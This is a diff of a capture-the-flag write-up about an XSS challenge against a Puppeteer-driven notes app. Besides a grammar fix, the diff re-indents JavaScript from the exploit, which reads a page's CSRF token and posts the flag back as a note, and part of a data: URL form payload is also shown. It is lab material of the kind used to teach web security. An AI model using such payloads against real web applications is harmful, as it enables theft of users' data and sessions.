@@ -18,7 +18,7 @@ It's functionality was that a user could register, login, write/delete notes whi
 
 A quick test of the note functionality showed that the app didn't do any sanitisation of user supplied input, but it did use CSRF tokens on the form used to submit our notes.
 
-Looking at the source code we could see that the application used Puppeteer - a headless chrome package - which is very commonly used in XSS challenges. Each time you submitted a link to the bot, it would create a new account using crypto.randomBytes(16) for both username and password, and then creating a note which would contain the flag. It would then open an about:blank page, and vist the link we reported.
+Looking at the source code we could see that the application used Puppeteer - a headless chrome package - which is very commonly used in XSS challenges. Each time you submitted a link to the bot, it would create a new account using crypto.randomBytes(16) for both username and password, and then create a note which would contain the flag. It would then open an about:blank page, and vist the link we reported.
 
 My first instinct was to attempt exfiltrate the bot's cookies/session, however the challenge description said that the bot didn't have internet access - each new instance of Puppeteer would actually point to http://0.0.0.0:8080 when creating that flag note. Later we found out that the challenge was altered and the bot was given internet access, however it did not affect our solution.
 
@@ -83,17 +83,17 @@ data:text/html;charset=utf-8,%3Chtml%3E%20%3Cbody%3E%20%3Cform%20action%3D%22htt
         parser = new DOMParser();
         let g = parser.parseFromString(y.responseText, "text/html")
         let s = g.getElementsByName('_csrf')[0].value
-    fetch('http://0.0.0.0:8080/new', {
-        method: 'POST',
-        credentials: 'include',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-            _csrf: s,
-            title: 'Hello',
-            content: flag,
-        }),
+        fetch('http://0.0.0.0:8080/new', {
+            method: 'POST',
+            credentials: 'include',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                _csrf: s,
+                title: 'Hello',
+                content: flag,
+            }),
     })
     }
     };
